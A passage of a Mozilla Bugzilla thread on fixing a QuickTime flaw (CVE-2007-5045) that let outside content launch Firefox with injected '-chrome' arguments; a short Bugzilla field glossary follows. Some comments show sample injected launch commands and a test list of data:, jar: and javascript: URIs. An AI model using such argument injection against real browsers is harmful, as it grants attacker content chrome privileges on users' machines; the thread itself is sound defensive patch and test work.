| [Updated](/show_bug.cgi?id=395942#a133106_1689)• 17 years ago |

[Attachment #280857](/attachment.cgi?id=280857&action=edit "trunk version") -
Flags: review?(mscott)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=395942#a133140_1689)• 17 years ago |

[Attachment #280857](/attachment.cgi?id=280857&action=edit "trunk version") -
Flags: review?(neil)

|  | [neil@parkwaycc.co.uk](/user_profile?user_id=14006) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=395942#c27)• 17 years ago |
|  | |

Comment on [attachment 280857](/attachment.cgi?id=280857 "trunk version") [[details]](/attachment.cgi?id=280857&action=edit "trunk version") [[diff]](/attachment.cgi?id=280857&action=diff "trunk version") [[review]](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280857)
trunk version
On the offchance that you need to change this patch for some reason...
>+const URI\_INHERITS\_SECURITY\_CONTEXT = nsIHttpProtocolHandler
>+ .URI\_INHERITS\_SECURITY\_CONTEXT;
Technically it's defined on nsIProtocolHandler ;-) I also wouldn't have minded it all on one line, it's only just over 80 chars and it's pretty obvious what the "missing" chars are :-)
>+ var netutil = Components.classes["@mozilla.org/network/util;1"]
>+ .getService(nsINetUtil);
I would have named it netUtil, but whatever :-)
[Attachment #280857](/attachment.cgi?id=280857&action=edit "trunk version") -
Flags: review?(neil) → review+

|  | [neil@parkwaycc.co.uk](/user_profile?user_id=14006) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=395942#c28)• 17 years ago |
|  | |

At least with my simple test cases javascript: doesn't appear to be affected on the branch ("Permission denied to get property UnnamedClass.foo"), only on the trunk; data: is affected on both branch and trunk.

|  | [Biju](/user_profile?user_id=80752) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=395942#c29)• 17 years ago |
|  | |

Attached file
[test\_popups.html (crashes QT 7.2 on windows -- beware!)](attachment.cgi?id=280881)
— [Details](attachment.cgi?id=280881&action=edit)

I and many others started using Mozilla to avoid popup and activex.
So please ensure above fix can also stop popups by
testing using the attached test\_popups.html.
test also from Seamonkey when firefox is the default browser.
and also other way arround.
I would a have wished "firefox" VS "firefox-cli" solution
suggested in [comment #14](/show_bug.cgi?id=395942#c14 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")")
And leave a power full command line option
> firefox-cli.exe -chrome javascript:alert('hello from an ext pgm')
as feature for any application to use.

|  | [:Gavin Sharp [email: gavin@gavinsharp.com]](/user_profile?user_id=103593)  Reporter |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=395942#c30)• 17 years ago |
|  | |

Comment on [attachment 280849](/attachment.cgi?id=280849 "1.8 branch patch v2") [[details]](/attachment.cgi?id=280849&action=edit "1.8 branch patch v2") [[diff]](/attachment.cgi?id=280849&action=diff "1.8 branch patch v2") [[review]](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280849)
1.8 branch patch v2
r- per comments on IRC (this scheme checking isn't sufficient).
[Attachment #280849](/attachment.cgi?id=280849&action=edit "1.8 branch patch v2") -
Flags: review?(gavin.sharp) → review-

|  | [:Gavin Sharp [email: gavin@gavinsharp.com]](/user_profile?user_id=103593)  Reporter |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=395942#c31)• 17 years ago |
|  | |

Comment on [attachment 280857](/attachment.cgi?id=280857 "trunk version") [[details]](/attachment.cgi?id=280857&action=edit "trunk version") [[diff]](/attachment.cgi?id=280857&action=diff "trunk version") [[review]](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280857)
trunk version
>Index: browser/components/nsBrowserContentHandler.js
>+ // only load URIs which do not inherit chrome privs
> var features = "chrome,dialog=no,all" + this.getFeatures(cmdLine);
>- openWindow(null, chromeParam, "\_blank", features, "");
>+ var uri = resolveURIInternal(cmdLine, chromeParam);
>+ var netutil = Components.classes["@mozilla.org/network/util;1"]
>+ .getService(nsINetUtil);
>+ if (!netutil.URIChainHasFlags(uri, URI\_INHERITS\_SECURITY\_CONTEXT)) {
>+ openWindow(null, chromeParam, "\_blank", features, "");
Maybe use uri.spec, to make sure the that you're actually using the result of the URI parsing (and therefore the URI that passed the security check)?
I only tested the /toolkit and /browser bits, r=me on those.
[Attachment #280857](/attachment.cgi?id=280857&action=edit "trunk version") -
Flags: review?(gavin.sharp) → review+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=395942#c32)• 17 years ago |
|  | |

Attached patch

[1.8 branch patch v3](attachment.cgi?id=280914&action=diff) (obsolete)
— [Details](attachment.cgi?id=280914&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280914)

Couldn't make checkLoadURI() work without crashing (null dereference trying to create an exception object on the "current window" since we don't have one). Had to simulate the nested URI support inline.
[Attachment #280849](/attachment.cgi?id=280849&action=edit "1.8 branch patch v2") -
Attachment is obsolete: true
[Attachment #280914](/attachment.cgi?id=280914&action=edit "1.8 branch patch v3") -
Flags: review?(gavin.sharp)

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=395942#c33)• 17 years ago |
|  | |

Why not use nsIJARURI like the security manager does instead of doing fragile string manipulation?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=395942#c34)• 17 years ago |
|  | |

[Bug 396196](/show_bug.cgi?id=396196 "RESOLVED WONTFIX - Use wrapper executable with no extra options for OS Integration") filed to cover the launcher/wrapper program idea ([comment 7](/show_bug.cgi?id=395942#c7 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")")). That approach would require changes to the installer and a lot more tendrils that I'm uncomfortable making in a rush to get this fix out for the branch.
Biju: as a branch firedrill we're not looking to make things perfect, just close off the worst trojan-installing aspects. We do expect Apple to fix QuickTime at some point, this is just to buy time until then.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=395942#c35)• 17 years ago |
|  | |

Attached patch

[1.8 branch patch v4 (use nsIJARURI)](attachment.cgi?id=280917&action=diff)
— [Details](attachment.cgi?id=280917&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280917)

[Attachment #280914](/attachment.cgi?id=280914&action=edit "1.8 branch patch v3") -
Attachment is obsolete: true
[Attachment #280917](/attachment.cgi?id=280917&action=edit "1.8 branch patch v4 (use nsIJARURI)") -
Flags: review?(gavin.sharp)
[Attachment #280914](/attachment.cgi?id=280914&action=edit "1.8 branch patch v3") -
Flags: review?(gavin.sharp)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=395942#a175639_1689)• 17 years ago |

[Attachment #280857](/attachment.cgi?id=280857&action=edit "trunk version") -
Flags: approval1.9?

|  | [Mike Beltzner [:beltzner, not reading bugmail]](/user_profile?user_id=137548) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=395942#a176482_137548)• 17 years ago |

Flags: blocking1.9? → blocking1.9+

|  | [:Gavin Sharp [email: gavin@gavinsharp.com]](/user_profile?user_id=103593)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=395942#a178705_103593)• 17 years ago |

[Attachment #280917](/attachment.cgi?id=280917&action=edit "1.8 branch patch v4 (use nsIJARURI)") -
Flags: review?(gavin.sharp) → review+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=395942#c36)• 17 years ago |
|  | |

Comment on [attachment 280917](/attachment.cgi?id=280917 "1.8 branch patch v4 (use nsIJARURI)") [[details]](/attachment.cgi?id=280917&action=edit "1.8 branch patch v4 (use nsIJARURI)") [[diff]](/attachment.cgi?id=280917&action=diff "1.8 branch patch v4 (use nsIJARURI)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280917)
1.8 branch patch v4 (use nsIJARURI)
approved for 1.8.1.7/1.8.1.8, a=dveditz
[Attachment #280917](/attachment.cgi?id=280917&action=edit "1.8 branch patch v4 (use nsIJARURI)") -
Flags: approval1.8.1.8+
[Attachment #280917](/attachment.cgi?id=280917&action=edit "1.8 branch patch v4 (use nsIJARURI)") -
Flags: approval1.8.1.7+

|  | [:Gavin Sharp [email: gavin@gavinsharp.com]](/user_profile?user_id=103593)  Reporter |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=395942#c37)• 17 years ago |
|  | |

Leaving this list of URIs as sec-sensitive for now.
I tested before/after for the branch and trunk patches against the list of URIs at:
<http://people.mozilla.com/~gavin/bug/qt/urilist.txt>
using:
firefox.exe -chrome <uri>
Summary:
should be blocked:
jar:data:
jar:jar:data:
javascript:alert(Components.stack);
data:
shouldn't get chrome privs:
file:
http:
should still work (get chrome privs):
chrome:

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=395942#c38)• 17 years ago |
|  | |

Checked into MOZILLA\_1\_8\_BRANCH and GECKO181\_20070712\_RELBRANCH for 1.8.1.8 and 1.8.1.7Keywords: [fixed1.8.1.7](/buglist.cgi?keywords=fixed1.8.1.7&resolution=---),
[fixed1.8.1.8](/buglist.cgi?keywords=fixed1.8.1.8&resolution=---)Whiteboard: [sg:critical] interaction with quicktime on Windows

|  | [neil@parkwaycc.co.uk](/user_profile?user_id=14006) |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=395942#c39)• 17 years ago |
|  | |

Attached patch

[XPFE patch](attachment.cgi?id=280995&action=diff)
— [Details](attachment.cgi?id=280995&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280995)

PFE startup is weird. Apparently the way to distinguish the chrome commandline handler is that it handles args but doesn't open the window with them.
[Attachment #280995](/attachment.cgi?id=280995&action=edit "XPFE patch") -
Flags: superreview?(dveditz)
[Attachment #280995](/attachment.cgi?id=280995&action=edit "XPFE patch") -
Flags: review?(jag)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=395942#c40)• 17 years ago |
|  | |

According to <http://docs.info.apple.com/article.html?artnum=305149> this problem shouldn't be happening regardless of the broken way in which the default browser is launched. qtnext is supposed to be limited to http: and https: urls (last advisory on the page).

|  | [jag (Peter Annema)](/user_profile?user_id=29582) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=395942#a282291_29582)• 17 years ago |

[Attachment #280995](/attachment.cgi?id=280995&action=edit "XPFE patch") -
Flags: review?(jag) → review+

|  | [Carsten Book [:Tomcat]](/user_profile?user_id=277293) |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=395942#c41)• 17 years ago |
|  | |

i used the Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.7) Gecko/2007091417 Firefox/2.0.0.7 Firefox 2007 RC2 for some tests and <http://www.gnucitizen.org/projects/0day-quicktime-pwns-firefox/>
None of this testcases works for me in Firefox 2.0.0.7rc2. Only a second browser window is launched but no other application like calc or so.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=395942#c42)• 17 years ago |
|  | |

The additional browser window is expected. If the -chrome argument is rejected then the browser will behave as if it's not there at all, generally opening a new window unless other arguments say to do something else.

|  | [uamjet602](/user_profile?user_id=12908) |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=395942#c43)• 17 years ago |
|  | |

Probably too late, but you could also include another binary or script specifically for this purpose (launching a browser from external sources), and for double measure make it check for the arguments that the registry specifies and bomb otherwise.

|  | [Giorgio Maone [:ma1]](/user_profile?user_id=151994) |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=395942#c44)• 17 years ago |
|  | |

(In reply to [comment #43](/show_bug.cgi?id=395942#c43 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")"))
> Probably too late, but you could also include another binary or script
> specifically for this purpose (launching a browser from external sources), and
> for double measure make it check for the arguments that the registry specifies
> and bomb otherwise.
You probably mean [Comment 7](/show_bug.cgi?id=395942#c7 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")") and [Comment 14](/show_bug.cgi?id=395942#c14 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")"), which [Comment 34](/show_bug.cgi?id=395942#c34 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")") morphed into [Bug 396196](/show_bug.cgi?id=396196 "RESOLVED WONTFIX - Use wrapper executable with no extra options for OS Integration").

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=395942#c45)• 17 years ago |
|  | |

So is the "trunk version" patch still waiting on reviews? Or does it just need approval to land?

|  | [Dão Gottwald [:dao]](/user_profile?user_id=219124) |  |
| --- | --- | --- |
| [Comment 46](/show_bug.cgi?id=395942#c46)• 17 years ago |
|  | |

Comment on [attachment 280857](/attachment.cgi?id=280857 "trunk version") [[details]](/attachment.cgi?id=280857&action=edit "trunk version") [[diff]](/attachment.cgi?id=280857&action=diff "trunk version") [[review]](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280857)
trunk version
Already blocking -> approval not needed. mscott's review is pending.
[Attachment #280857](/attachment.cgi?id=280857&action=edit "trunk version") -
Flags: approval1.9?

|  | [Carsten Book [:Tomcat]](/user_profile?user_id=277293) |  |
| --- | --- | --- |
| [Comment 47](/show_bug.cgi?id=395942#c47)• 17 years ago |
|  | |

verified fixed 1.8.1.7 after testsruns with the exploit testcases on <http://www.gnucitizen.org/projects/0day-quicktime-pwns-firefox/>
Tested the normal behavior when Firefox is loaded and also launching firefox with the testcases
-> adding verified keyword Keywords: [fixed1.8.1.7](/buglist.cgi?keywords=fixed1.8.1.7&resolution=---) → [verified1.8.1.7](/buglist.cgi?keywords=verified1.8.1.7&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 48](/show_bug.cgi?id=395942#c48)• 17 years ago |
|  | |

Comment on [attachment 280995](/attachment.cgi?id=280995 "XPFE patch") [[details]](/attachment.cgi?id=280995&action=edit "XPFE patch") [[diff]](/attachment.cgi?id=280995&action=diff "XPFE patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280995)
XPFE patch
sr=dveditz
a=dveditz to land this seamonkey only change on the branches.
[Attachment #280995](/attachment.cgi?id=280995&action=edit "XPFE patch") -
Flags: superreview?(dveditz)
[Attachment #280995](/attachment.cgi?id=280995&action=edit "XPFE patch") -
Flags: superreview+
[Attachment #280995](/attachment.cgi?id=280995&action=edit "XPFE patch") -
Flags: approval1.8.1.8+
[Attachment #280995](/attachment.cgi?id=280995&action=edit "XPFE patch") -
Flags: approval1.8.1.7+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 49](/show_bug.cgi?id=395942#c49)• 17 years ago |
|  | |

Trunk version is just waiting for a non-busted tree to land. I keep missing the windows

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 50](/show_bug.cgi?id=395942#c50)• 17 years ago |
|  | |

(In reply to [comment #46](/show_bug.cgi?id=395942#c46 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")"))
> Already blocking -> approval not needed.
According to the tree rules at the time ("threat level red") is was. Apparently the rules change day to day just to keep us on our toes.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 51](/show_bug.cgi?id=395942#c51)• 17 years ago |
|  | |

Checking in browser/components/nsBrowserContentHandler.js;
/cvsroot/mozilla/browser/components/nsBrowserContentHandler.js,v <-- nsBrowserContentHandler.js
new revision: 1.45; previous revision: 1.44
done
Checking in mail/components/nsMailDefaultHandler.js;
/cvsroot/mozilla/mail/components/nsMailDefaultHandler.js,v <-- nsMailDefaultHandler.js
new revision: 1.9; previous revision: 1.8
done
Checking in suite/browser/nsBrowserContentHandler.js;
/cvsroot/mozilla/suite/browser/nsBrowserContentHandler.js,v <-- nsBrowserContentHandler.js
new revision: 1.6; previous revision: 1.5
done
Checking in toolkit/mozapps/extensions/src/nsExtensionManager.js.in;
/cvsroot/mozilla/toolkit/mozapps/extensions/src/nsExtensionManager.js.in,v <-- nsExtensionManager.js.in
new revision: 1.255; previous revision: 1.254
done
Status: NEW → RESOLVEDClosed: 17 years agoResolution: --- → FIXED

|  | [Carsten Book [:Tomcat]](/user_profile?user_id=277293) |  |
| --- | --- | --- |
| [Comment 52](/show_bug.cgi?id=395942#c52)• 17 years ago |
|  | |

verified fixed using Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a8pre) Gecko/2007091804 Minefield/3.0a8pre and the exploit testcases - same results as for 1.8.1.7 see [comment #47](/show_bug.cgi?id=395942#c47 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")")
- Changing Bug to verifiedStatus: RESOLVED → VERIFIED

|  | [Scott MacGregor](/user_profile?user_id=93208) |  |
| --- | --- | --- |
| [Comment 53](/show_bug.cgi?id=395942#c53)• 17 years ago |
|  | |

Comment on [attachment 280857](/attachment.cgi?id=280857 "trunk version") [[details]](/attachment.cgi?id=280857&action=edit "trunk version") [[diff]](/attachment.cgi?id=280857&action=diff "trunk version") [[review]](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280857)
trunk version
not sure if you still need this but it looks good to me Dan.
[Attachment #280857](/attachment.cgi?id=280857&action=edit "trunk version") -
Flags: review?(mscott) → review+

|  | [Biju](/user_profile?user_id=80752) |  |
| --- | --- | --- |
| [Comment 54](/show_bug.cgi?id=395942#c54)• 17 years ago |
|  | |

now [attachment 280881](/attachment.cgi?id=280881) [[details]](/attachment.cgi?id=280881&action=edit) test\_popups.html
is making firefox crash ir run CPU at near 100%
bug report
----------
BuildID: 2007091804
CrashTime: 1190164012
Email: bijumaillist@gmail.com
InstallTime: 1190163434
ProductName: Firefox
SecondsSinceLastCrash: 16
URL: <https://bugzilla.mozilla.org/attachment.cgi?id=280881>
UserID: b337f90c-beb0-4dbd-98ee-dca08d81381b
Vendor: Mozilla
Version: 3.0a8pre
This report also contains information about the state of the application when it crashed.

|  | [Carsten Book [:Tomcat]](/user_profile?user_id=277293) |  |
| --- | --- | --- |
| [Comment 55](/show_bug.cgi?id=395942#c55)• 17 years ago |
|  | |

(In reply to [comment #54](/show_bug.cgi?id=395942#c54 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")"))
> now [attachment 280881](/attachment.cgi?id=280881) [[details]](/attachment.cgi?id=280881&action=edit) test\_popups.html
> is making firefox crash ir run CPU at near 100%
>
thats [bug 396228](/show_bug.cgi?id=396228 "RESOLVED INCOMPLETE - QuickTime crashes Firefox with qtnext popups [@ ntdll.dll@0x2b239]"), but its not a regression of this bug/patch, has crashed also before the patch was checked in.

|  | [Biju](/user_profile?user_id=80752) |  |
| --- | --- | --- |
| [Comment 56](/show_bug.cgi?id=395942#c56)• 17 years ago |
|  | |

(In reply to [comment #55](/show_bug.cgi?id=395942#c55 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")"))
> thats [bug 396228](/show_bug.cgi?id=396228 "RESOLVED INCOMPLETE - QuickTime crashes Firefox with qtnext popups [@ ntdll.dll@0x2b239]"), but its not a regression of this bug/patch,
> has crashed also before the patch was checked in.
Thanks for info

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 57](/show_bug.cgi?id=395942#c57)• 17 years ago |
|  | |

Biju's popup issue and crashing testcase moved to [bug 396228](/show_bug.cgi?id=396228 "RESOLVED INCOMPLETE - QuickTime crashes Firefox with qtnext popups [@ ntdll.dll@0x2b239]"). I've hidden the attachment here to avoid commingling the issues.Summary: QuickTime flaw allows launching default browser with arbitrary parameters ("quicktime pwns firefox") → QuickTime flaw allows launching default browser with arbitrary parameters on Windows ("quicktime pwns firefox")Whiteboard: [sg:critical] interaction with quicktime on Windows → [sg:critical] mitigation for QT Windows flaw. QT popup crash now bug 396228

|  | [pal-moz](/user_profile?user_id=216973) |  |
| --- | --- | --- |
| [Comment 58](/show_bug.cgi?id=395942#c58)• 17 years ago |
|  | |

GP a8(M8) RC2 is released before official a8 ?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 59](/show_bug.cgi?id=395942#c59)• 17 years ago |
|  | |

pal-moz: not entirely sure what you mean, but discussion not about fixing the bug in question does not belong in bugzilla. Please find our developer forums. Obviously our builds are available to testers in the "nightly" test directories before we actually release them, otherwise they would be released untested.
This bug is not fixed in the "M8" release today. The code-freeze for M8 was before this bug was filed. The bug is fixed in Firefox 2.0.0.7 and Firefox 3 nightlies.

|  | [pal-moz](/user_profile?user_id=216973) |  |
| --- | --- | --- |
| [Comment 60](/show_bug.cgi?id=395942#c60)• 17 years ago |
|  | |

(In reply to [comment #59](/show_bug.cgi?id=395942#c59 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")"))
> This bug is not fixed in the "M8" release today. The code-freeze for M8 was
> before this bug was filed. The bug is fixed in Firefox 2.0.0.7 and Firefox 3
> nightlies.
>
I know.
if M8 (the build including this bug) will be released, M8 will be a risky/dangerous build ?
so RC2 with this fix should be out/tested, then release as an official M8 build ?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 61](/show_bug.cgi?id=395942#c61)• 17 years ago |
|  | |

M8 will be released with this flaw unfixed, M9 will come in a few weeks. Alpha builds are not intended for daily use, they are technology previews so people can play with the new features and do some compatibility testing. Anyone using the build on a daily or regular basis is a "tester", and testers should be using nightly builds (which will have the fix) rather than infrequent alpha builds.

|  | [georgi - hopefully not receiving bugspam](/user_profile?user_id=23768) |  |
| --- | --- | --- |
| [Comment 62](/show_bug.cgi?id=395942#c62)• 17 years ago |
|  | |

isn't running with user supplied http chrome risky?

|  | [neil@parkwaycc.co.uk](/user_profile?user_id=14006) |  |
| --- | --- | --- |
| [Comment 63](/show_bug.cgi?id=395942#c63)• 17 years ago |
|  | |

(In reply to [comment #62](/show_bug.cgi?id=395942#c62 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")"))
>isn't running with user supplied http chrome risky?
Unlike data, http doesn't gain privileges from running as -chrome

|  | [neil@parkwaycc.co.uk](/user_profile?user_id=14006) |  |
| --- | --- | --- |
| [Comment 64](/show_bug.cgi?id=395942#c64)• 17 years ago |
|  | |

XPFE patch checked in to the branch.Keywords: [fixed-seamonkey1.1.5](/buglist.cgi?keywords=fixed-seamonkey1.1.5&resolution=---)

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 65](/show_bug.cgi?id=395942#c65)• 17 years ago |
|  | |

(In reply to [comment #64](/show_bug.cgi?id=395942#c64 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")"))
> XPFE patch checked in to the branch.
Seems to have broken Camino on the 1.8 branch -- the 1.8 branch Camino tinderboxes are unfortunately at <http://tinderbox.mozilla.org/Camino/> .

|  | [neil@parkwaycc.co.uk](/user_profile?user_id=14006) |  |
| --- | --- | --- |
| [Comment 66](/show_bug.cgi?id=395942#c66)• 17 years ago |
|  | |

Sorry, the patch was missing a change to Makefile.in; I've fixed that now.Group: security

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=395942#a1479484_1689)• 17 years ago |

Group: security

|  | [Carsten Book [:Tomcat]](/user_profile?user_id=277293) |  |
| --- | --- | --- |
| [Comment 67](/show_bug.cgi?id=395942#c67)• 17 years ago |
|  | |

verified fixed 1.8.1.8 using the testcases and Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1.8pre) Gecko/20070927 BonEcho/2.0.0.8pre ID:2007092704
Same results as for the 1.8.1.7 build ([Comment #47](/show_bug.cgi?id=395942#c47 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")"))
-> Adding the 1.8.1.8 verified keywordKeywords: [fixed1.8.1.8](/buglist.cgi?keywords=fixed1.8.1.8&resolution=---) → [verified1.8.1.8](/buglist.cgi?keywords=verified1.8.1.8&resolution=---)

|  | [Josh Bressers](/user_profile?user_id=190763) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=395942#a2934409_190763)• 17 years ago |

Alias: CVE-2007-5045

|  | [OstGote!](/user_profile?user_id=51898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=395942#a9402236_51898)• 17 years ago |

Ever confirmed: true

|  | [OstGote!](/user_profile?user_id=51898) |  |
| --- | --- | --- |
| [Comment 68](/show_bug.cgi?id=395942#c68)• 17 years ago |
|  | |

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=395942#a10793821_135518)• 17 years ago |

Depends on: [412434](/show_bug.cgi?id=412434 "RESOLVED FIXED - opening a window with -chrome does not work anymore")

|  | [Alexander Sack](/user_profile?user_id=113760) |  |
| --- | --- | --- |
| [Comment 69](/show_bug.cgi?id=395942#c69)• 17 years ago |
|  | |

Comment on [attachment 280917](/attachment.cgi?id=280917 "1.8 branch patch v4 (use nsIJARURI)") [[details]](/attachment.cgi?id=280917&action=edit "1.8 branch patch v4 (use nsIJARURI)") [[diff]](/attachment.cgi?id=280917&action=diff "1.8 branch patch v4 (use nsIJARURI)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280917)
1.8 branch patch v4 (use nsIJARURI)
a=asac for 1.8.0.15
[Attachment #280917](/attachment.cgi?id=280917&action=edit "1.8 branch patch v4 (use nsIJARURI)") -
Flags: approval1.8.0.15+

|  | [Alexander Sack](/user_profile?user_id=113760) |  |
| --- | --- | --- |
| [Comment 70](/show_bug.cgi?id=395942#c70)• 17 years ago |
|  | |

Comment on [attachment 280995](/attachment.cgi?id=280995 "XPFE patch") [[details]](/attachment.cgi?id=280995&action=edit "XPFE patch") [[diff]](/attachment.cgi?id=280995&action=diff "XPFE patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280995)
XPFE patch
a=asac for 1.8.0.15
[Attachment #280995](/attachment.cgi?id=280995&action=edit "XPFE patch") -
Flags: approval1.8.0.15+

|  | [Christopher Aillon (sabbatical, not receiving bugmail)](/user_profile?user_id=32335) |  |
| --- | --- | --- |
| [Comment 71](/show_bug.cgi?id=395942#c71)• 17 years ago |
|  | |

Committed attachments 280917 and 280995 to the 1.8.0 branchKeywords: [fixed1.8.0.15](/buglist.cgi?keywords=fixed1.8.0.15&resolution=---)
You need to [log in](/show_bug.cgi?id=395942&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [:Gavin Sharp [email: gavin@gavinsharp.com]](/user_profile?user_id=103593)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from wiki.mozilla.org_73f8d6fa_20250126_024013.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
